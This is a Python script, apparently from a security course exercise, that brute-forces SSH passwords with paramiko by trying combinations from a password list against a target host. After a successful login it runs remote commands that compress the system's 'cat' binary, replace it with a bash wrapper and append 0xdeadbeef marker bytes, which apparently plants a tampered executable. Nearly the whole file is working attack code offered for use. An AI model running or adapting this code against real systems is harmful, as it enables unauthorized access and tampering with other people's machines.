import itertools
import socket
import time

import paramiko
from colorama import Fore, init

# initialize colorama
init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE


def trySSH(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        return False
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException:
        # sleep for a minute
        time.sleep(60)
        return trySSH(hostname, username, password)
    else:
        print("connection was established successfully")
        client.exec_command('pack cat')
        client.exec_command('mv cat.z cat')
        client.exec_command("echo -e '#!/bin/bash\ntruncate -s -4 cat;exit;$(cat cat)' > cat")
        client.exec_command("echo -en '\xaf\xbe\xad\xde' >> cat")

        return True


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")

    user = 'csc2022'
    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    # read the file
    passlist = open('passlist').read().splitlines()
    # brute-force
    els = []
    for i in range(1, len(passlist)+1):
        els.extend([list(x) for x in itertools.combinations(passlist, i)])
    for password in els:
        trySSH(host, user, ''.join(password))
